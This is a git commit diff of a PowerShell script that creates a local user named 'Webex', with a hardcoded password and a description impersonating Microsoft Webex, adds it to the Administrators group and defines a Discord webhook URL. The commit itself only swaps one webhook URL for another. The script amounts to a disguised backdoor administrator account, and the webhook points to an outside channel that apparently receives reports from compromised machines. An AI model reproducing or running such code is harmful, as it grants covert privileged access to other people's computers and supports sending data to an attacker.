29064ed2af1fd69df7481102a132e2ff5f0281b0
Corazon <41511738+assafgold1@users.noreply.github.com>
2024-08-03 03:27:26 +0300

    Update create_user_window.ps1

--- create_user_window.ps1
+++ create_user_window.ps1
@@ -1,7 +1,7 @@
 $username = "Webex"
 $password = "ialafgZ368p1"
 $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$webhookUrl = "https://discord.com/api/webhooks/1269088317715255296/0pnxttnfuBBlzo-n0d_yoQswurNWjosz__HKVLxxg-Okdrbpvg1BQkLUe1vE25Ohl0N5"
+$webhookUrl = "https://discord.com/api/webhooks/1269087901136719972/rodv_fsXn8trX6SESMv0JzMyVTARJYtzKyEETjjThEzEmHDPG2KiCJfnfufKt_Kc5gur"
 
 New-LocalUser $username -Password $securePassword -FullName "microsoft webex" -Description "Microsoft WeBex.com"
 Add-LocalGroupMember -Group "Administrators" -Member $username
